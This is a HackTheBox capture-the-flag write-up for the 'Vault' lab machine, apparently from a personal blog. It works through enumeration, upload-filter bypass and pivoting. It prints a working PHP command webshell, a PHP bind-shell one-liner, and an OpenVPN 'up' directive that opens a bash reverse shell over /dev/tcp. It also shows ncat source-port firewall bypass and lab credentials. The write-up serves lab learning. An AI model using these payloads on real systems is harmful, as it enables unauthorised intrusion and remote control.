---
title: "HackTheBox Write-up: Vault"
date: 2023-02-20
description: "My write-up for the HackTheBox box named Vault"
summary: "My write-up for the HackTheBox box named Vault"
tags: ["htb", "writeup", "vault"]
---

This is my write-up for the HackTheBox Machine named Vault. I have to give a
large thanks to the creators of the machine who have put a lot of effort into
it, and allowed me and many others to learn a tremendous amount.

Let's get straight into it!

A quick top 10000 TCP port scan reveals that ports 22 and 80 are open, so we do
a version scan on them:

```c {hl_lines=[1]}
$ nmap 10.10.10.109 -sV -p22,80
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-12 14:06 AEDT
Nmap scan report for 10.10.10.109
Host is up (0.41s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website on port 80, we are greeted with a static page with generic information on it. Trying gobuster to brute force sub-pages as follows unfortunately returns no useful results:

```c
$ gobuster -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I was a bit stuck at where to get started, but then decided to look at the
message on the main page as a hint. The message included custom words, which may help us find a custom path on the website. So, let's try get a list of all words on the page and see if we can gobust anything useful with those terms:

```c {hl_lines=[1,2]}
$ cewl "http://10.10.10.109" | tr "[:upper:]" "[:lower:]" > cewl-vault.txt
$ gobuster -u "http://10.10.10.109 -w cewl-vault.txt"
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/
[+] Threads      : 10
[+] Wordlist     : cewl-vault.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/04/07 13:20:46 Starting gobuster
=====================================================
/sparklays (Status: 301)
=====================================================
2019/04/07 13:20:49 Finished
=====================================================
```

Note that we converted all our results from `cewl` to lowercase before passing
the results into `gobuster`.

Now we have the next step! We visit `http://10.10.10.109/sparklays` and are
forwarded to `/sparklays/`  and then greeted with a Forbidden error!

So let's keep looking deeper into the `sparklays` folder:

```c {hl_lines=[1]}
$ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/design (Status: 301)
```

Visiting `http://10.10.10.109/sparklays/design` forwards us to `/sparklays/design/`
and then also shows a Forbidden error. Let's try to continue going deeper!

```c {hl_lines=[1]}
$ gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/uploads (Status: 301)
```

Same Forbidden error again! This time we have the URL of `http://10.10.10.109/sparklays/design/uploads/`.

Unfortunately, running `gobuster` again on this URL returns no useful results. Now we have another seemingly dead end. However, as we know these folders exist on the server, they must have something else inside them....right?

Let's try `gobuster` with a few different file formats, like `php,jsp,asp,aspx,do,html`, which are commonly found on web servers:

```c {hl_lines=[1]}
$ gobuster -u http://10.10.10.109/sparklays/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,jsp,asp,aspx,do,html
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
```

Great! Looks like we have a PHP server under `/sparklays/`!

At `http://10.10.10.109/sparklays/login.php` we see a message saying access
denied, and at `http://10.10.10.109/sparklays/admin.php` we see a login page
asking for a username and a password. At first thoughts, we could try some SQL
injection or try to guess usernames and passwords, but first, let's keep looking
for more PHP and HTML files under the other folders:

```c {hl_lines=[1]}
$ gobuster -u http://10.10.10.109/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
/uploads (Status: 301)
/design.html (Status: 200)
```

We have a new page! Let's check out design.html. Running `curl
http://10.10.10.109/sparklays/design/design.html` gives us:

```html
<h1> Design Settings </h1>
<p>
<a href="changelogo.php">Change Logo</a>
```

Going to the link pointed to in the HREF leads us to a new page, where see an upload form! I wonder if this is related to the other `gobuster`
finding of `/uploads/`...

Knowing this is a PHP server, we copy `/usr/share/webshells/php/simple-backdoor.php` to our working directory and try to upload it using the form above. Unfortunately, the server returns the response: `sorry that file type is not allowed`.

Looks like there is a filter that doesn't allow certain file types! As this
sounds like a blacklisting approach rather than a whitelisting approach, we may
be able to bypass the upload filter.

Here is a good guide on different techniques to bypass file upload restrictions:
https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/

For us, we could try uploading an image with PHP code, or a file with two
extensions, use a null character, or try other extensions like `php5` and `php3`.

Skipping the trial and error, we find that we can bypass the upload filter using `.php5` extension! The following is the POST request on the upload form with our
simple-backdoor file being sent with a `.php5` extension:

```http
POST /sparklays/design/changelogo.php HTTP/1.1
Host: 10.10.10.109
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.109/sparklays/design/changelogo.php
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------15883744739994925651308469802
Content-Length: 534

-----------------------------15883744739994925651308469802
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php5"
Content-Type: application/x-php

<?php 
if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}
?>
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

-----------------------------15883744739994925651308469802
Content-Disposition: form-data; name="submit"

upload file
-----------------------------15883744739994925651308469802--
```

Once this request is sent, the server then returns a message saying The file was
uploaded successfully!

Taking a guess at the folder named uploads, we find our PHP webshell uploaded to
the server at the following URL: `http://10.10.10.109/sparklays/design/uploads/simple-backdoor.php5`. Additionally,
we can execute commands through this web shell like this: `curl
http://10.10.10.109/sparklays/design/uploads/simple-backdoor.php5?cmd=whoami`,
which returns:

```
www-data
```

Unfortunately I didn't have much luck with gaining a reverse shell through this
webshell, however I then decided to try a **bind shell**. The following is a
one-liner bind shell in PHP that will open a socket on port 2222 on the
compromised host:

```c
$ php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

We can use the above bind shell payload through our webshell to gain a nicer shell:

```
http://10.10.10.109/sparklays/design/uploads/simple-backdoor.php5?cmd=php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",2222);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

Then, connecting to port 2222 on Vault gives us access as `www-data`:

```c {hl_lines=[1,2]}
$ nc 10.10.10.109 2222
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Looking through the `/home` folders on the server, we find users named `alex` and `dave`, and we find some interesting files on Dave's Desktop:

```c {hl_lines=[1,8]}
$ ls -al /home/dave/Desktop
total 20
drwxr-xr-x  2 dave dave 4096 Nov 12 04:09 .
drwxr-xr-x 18 dave dave 4096 Sep  3 08:34 ..
-rw-rw-r--  1 alex alex   74 Jul 17 10:30 Servers
-rw-rw-r--  1 alex alex   14 Jul 17 10:31 key
-rw-rw-r--  1 alex alex   20 Jul 17 10:31 ssh
$ cat /home/dave/Desktop/*
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
itscominghome
dave
Dav3therav3123
```

Unfortunately it doesn't look like `user.txt` is on this host, but we have some
hints for where to go next. From the Servers  file, we find two other targets at `192.168.122.4` and `192.168.122.5`, and from the `ssh` file, we have what looks
like dave's password: `Dav3therav3123`.

So, let's try pivot through our compromised host and see if we can hit the above
two IP addresses. We first setup a SSH dynamic port forward using the `-D` flag,
and provide the password that we found in the `ssh` file for dave. We then setup
proxychains to use `127.0.0.1:8081` as a socks proxy, and nmap scan the `/24` subnet as follows:

```c
$ ssh -D 8081 dave@10.10.10.109
$ proxychains nmap 192.168.122.0/24
```

Alternatively, I also found that I could use python on the host, so I tried the
port scanner from [here](https://stackoverflow.com/questions/26174743/making-a-fast-port-scanner) after SSH'ing as dave:

```c {hl_lines=[1,6]}
dave@ubuntu:~$ python3 scan.py
Enter host IP: 192.168.122.4
How many seconds the socket is going to wait until timeout: 1
22: Listening
80: Listening
dave@ubuntu:~$ python3 scan.py
Enter host IP: 192.168.122.5
How many seconds the socket is going to wait until timeout: 1
```

It looks like we cannot see any open ports on `192.168.122.5`, however we have
found two ports open on `192.168.122.4`.

So, to visit the web server on `192.168.122.4`, we point our browser's SOCKS proxy
settings to our SSH tunnel on `127.0.0.1:8081`  and then visit `http://192.168.122.4/`

The first link to `http://192.168.122.4/dns-config.php` leads us to a `File Not
Found` error, and the second link leads us to the following page where it seems
like we can enter a VPN config to test!

Clicking the `Test VPN` link returns the message: `executed succesfully!`

So, it looks like we can enter a VPN config and have it executed on the server!

Before I get to how I exploited this, I also looked for whether the VPN file
that we update can be retrieved from the web server. Unfortunately, gobuster
didn't work well with a SOCKS proxy, but I was able to use `wfuzz` to look for
files with the extension of `vpn` or `ovpn` as follows:

```c {hl_lines=[1]}
$ wfuzz -p 127.0.0.1:8081:SOCKS4 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,vpn-ovpn --hc 404 http://192.168.122.4/FUZZ.FUZ2Z

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.122.4/FUZZ.FUZ2Z
Total requests: 441120

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
001630:  C=200      4 L	      15 W	    122 Ch	  "123 - ovpn"
```

Turns out we can fetch the OVPN config file from `http://192.168.122.4/123.ovpn`!

We test this by submitting the form on `/vpnconfig.php` and find that what we
submit in the text field gets updated in the `123.ovpn` file!

Awesome, now we can move to finding a way to get code execution through this ovpn file. Looking through the [OpenVPN man page](http://manpages.ubuntu.com/manpages/cosmic/en/man8/openvpn.8.html) we find that there is a parameter that can be used to pass in a command we want to execute once the VPN has been established.

We may have to setup a VPN server on our compromised host (named `ubuntu`) so that the connection is successful, but let's try uploading a test config to give us a
reverse shell:

```vpn
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/61234 0<&1 2>&1&'"
nobind
```

The above OVPN config says to connect to the VPN server at `192.168.122.1` (the
IP of `ubuntu`) and if the connection is successful, execute a bash reverse shell
to port `61234` also on `192.168.122.1`.

We submit the above config through `/vpnconfig.php` and start a `nc` listener on `ubuntu`:

```c {hl_lines=[1,6]}
dave@ubuntu:~$ nc -nvlp 61234
Listening on [0.0.0.0] (family 0, port 61234)
Connection from [192.168.122.4] port 61234 [tcp/] accepted (family 2, sport 58498)
bash: cannot set terminal process group (1072): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Surprisingly, we get a reverse shell almost straight away after clicking `Test
config`! I'm not exactly sure whether there is a VPN server running on `ubuntu`
and couldn't find one using `netstat` or `ps aux`, but I have a reverse shell
anyway! This time the host's name is `DNS` and we are running as `root`.

Looking around for more interesting files, we find DNS's password on the user's
desktop, and we also retrieve `user.txt` from dave's home folder:

```c {hl_lines=[1,7,10]}
root@DNS:/var/www/DNS/desktop# ls -al
total 12
drwxrwxr-x 2 root root 4096 Jul 17 10:34 .
drwxrwxr-x 3 root root 4096 Jul 17 12:46 ..
-rw-rw-r-- 1 root root   19 Jul 17 10:34 ssh
-rw-rw-r-- 1 root root    0 Jul 17 10:34 user.txt
root@DNS:/var/www/DNS/desktop# cat *
dave
dav3gerous567
root@DNS:/# cat /home/dave/user.txt
a4947fa*************************
```

And finally, we have user!

---

Let's move on to privesc!

We find another interesting file named `interfaces` in DNS's main folder:

```c {hl_lines=[1]}
root@DNS:/var/www/DNS# cat interfaces
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
```

In this file, we see routes to two networks added with two separate gateways.
One of these gateways being the firewall we've heard of earlier, at `192.168.122.5`. We haven't seen any `192.168.1.0/24` or `192.168.5.0/24` addresses
before, but it is likely we have to compromise something in one of these
networks next.

Interestingly, we also find `/usr/bin/nmap` available to us on the `DNS` server,
so we can use it directly from this host to try and find the host we have to
target next. After a lot of scanning, I wasn't finding anything interesting. I
then decided to look at logs on the DNS server, and finally found something
interesting:

```c {hl_lines=[1]}
root@DNS:/home/dave# grep -ra "192.168.5" /var/log . 2>/dev/null
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

Searching for any IP addresses in the `192.168.5.0/24` range in all files under
`/var/log`, we find very interesting records in `/var/log/auth.log`. Specifically,
above, we can see that a couple of commands have been run as `root`. Nmap has been run with the flag `--source-port=4444`, and `ncat` has been run with the flags `-l
1234` and `--sh-exec ncat 192.168.5.2 987 -p 53`. Looking at [ncat's man page](http://man7.org/linux/man-pages/man1/ncat.1.html), we see that `ncat` is listening on port 1234, and once that has been established, another `ncat` process is executed to connect to port `987` on `192.168.5.2` with a source port of `53`.

Noting that both ncat and nmap commands were run with specific source ports, and that we were unable to find any ports open on `192.168.5.2` with our own scanning of nmap, it can be assumed that the gateway in the middle actually prevents any connections to the `192.168.5.0/24` network unless they come from source ports like `53` and `4444`.

To test our assumption, we connect to the port that was connected to in the
above commands using `ncat` with a source port of `4444`:

```c {hl_lines=[1]}
root@DNS:/home/dave# ncat -p 4444 192.168.5.2 987
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

Awesome! We see that a SSH server is actually running on port `987` on `192.168.5.2`. Next, we can try some of the credentials we already have like `dave:Dav3therav3123` or `dave:dav3gerous567`. We setup a local listening port to
forward connections to the SSH server from a source port of `53`, and we
successfully login with the credentials `dave:dav3gerous567`:

```c {hl_lines=[1,2,10]}
root@DNS:/home/dave# /usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53"
root@DNS:~$ ssh dave@127.0.0.1 -p1234
The authenticity of host '[127.0.0.1]:1234 ([127.0.0.1]:1234)' can't be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:1234' (ECDSA) to the list of known hosts.
dave@127.0.0.1's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ id
uid=1001(dave) gid=1001(dave) groups=1001(dave)
```

We have a shell as dave  on Vault! However, when looking around, we STILL don't
have `root.txt`!

We do however find the following file on dave's home folder:

```c
dave@vault:~$ cat root.txt.gpg | base32
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=
```

It looks like this file has been encrypted with GPG encryption. I've converted
it to base64 so it is converted to printable characters.

To decrypt this `.gpg` file, I will need a GPG private key, but I haven't noticed
any so far. My best bet is to look around on the multiple hosts that I have
compromised to see if I can find any stored GPG keys.

To my luck, I find the first host that I compromised has a GPG key!

```c {hl_lines=[1]}
dave@ubuntu:~$ gpg --list-keys
/home/dave/.gnupg/pubring.gpg

pub   4096R/0FDFBFE4 2018-07-24
uid                  david
sub   4096R/D1EB1F03 2018-07-24
```

This GPG key is of course encrypted, so we cannot use it to decrypt `root.txt`
without a password. After trying all the password looking strings that we have
found above, I find that the password of `itscominghome` works for unlocking the
GPG private key!

We then use the following commands to decrypt `root.txt`:

```c {hl_lines=[1,2]}
dave@ubuntu:~/Documents$ base32 -d blah.32 > blah
dave@ubuntu:~/Documents$ gpg -d blah

You need a passphrase to unlock the secret key for user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24 "david <dave@david.com>"
ca46837*************************
```

And that's `root.txt`! Thank you to @nol0gz for creating this interesting box!

---

Live and Learn!
